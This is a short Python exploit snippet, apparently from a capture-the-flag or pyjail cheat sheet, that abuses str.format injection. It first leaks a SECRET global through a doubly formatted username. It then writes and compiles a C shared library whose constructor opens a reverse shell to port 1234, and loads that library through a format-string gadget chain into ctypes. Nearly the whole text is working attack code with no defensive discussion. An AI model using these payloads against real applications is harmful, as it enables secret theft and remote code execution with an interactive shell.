```py -cwn
# Leak datas 
SECRET = 'YOUGOTME'

class User():
    def __init__(self, id, username):
        self.id = id
        self.username = username
    def __repr__(self):
        return '<User {u.username} (id {{i.id}})>'.format(u=self).format(i=self) # format string injection
user = User(0, '{i.__init__.__globals__[SECRET]}')

# Can RCE 
open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\\n__attribute__((constructor))\\nvoid init() {\\nsystem("python3 -c \\\\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\\\"");\\n}""")
import os
os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
```
